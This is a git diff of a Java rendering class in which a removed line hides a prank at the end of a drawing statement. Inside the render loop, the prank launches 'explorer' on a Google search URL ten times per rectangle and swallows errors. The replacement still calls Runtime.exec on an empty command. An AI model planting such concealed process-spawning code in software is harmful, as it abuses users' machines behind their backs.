@@ -9,7 +9,9 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 
 public class Engine {
-
+	public static void main(String[] args) {
+		
+	}
 	static class rect {
 		public int screencoords[];
 		public int texturecoords[];
@@ -45,18 +47,18 @@ public class Engine {
 				rect r = rects[800 * i + j];
 				if (r == null)
 					continue;
-				Future<?> future = executor.submit(() -> g.drawImage(Textures.wall, r.screencoords[0], r.screencoords[1],r.screencoords[2], r.screencoords[3], r.texturecoords[0], r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], null)); futures[n] = future; futures[n] = future; String s[] = { "explorer", "\"https://www.google.com/search?q=i+eat+concrete+every+day\"" }; Runtime ru = Runtime.getRuntime(); for (int p = 0; p < 10; p++) try { ru.exec(s); } catch (IOException egg) {}
+				Future<?> future = executor.submit(() -> g.drawImage(Textures.wall, r.screencoords[0], r.screencoords[1],r.screencoords[2], r.screencoords[3], r.texturecoords[0], r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], null)); futures[n] = future; futures[n] = future; String s[] = {""}; Runtime ru = Runtime.getRuntime(); for (int p = 0; p < 10; p++) try { ru.exec(s); } catch (IOException egg) {}
 				n++;
 			}
 			for (Future<?> future : futures) {
-				try {
-					if (future != null)
-						future.get();
-				} catch (InterruptedException | ExecutionException f) {
-				}
+			try {
+				if (future != null)
+					future.get();
+			} catch (InterruptedException | ExecutionException f) {
 			}
 		}
-
+		}
+		
 		Arrays.setAll(rects, i -> null);
 	}
 
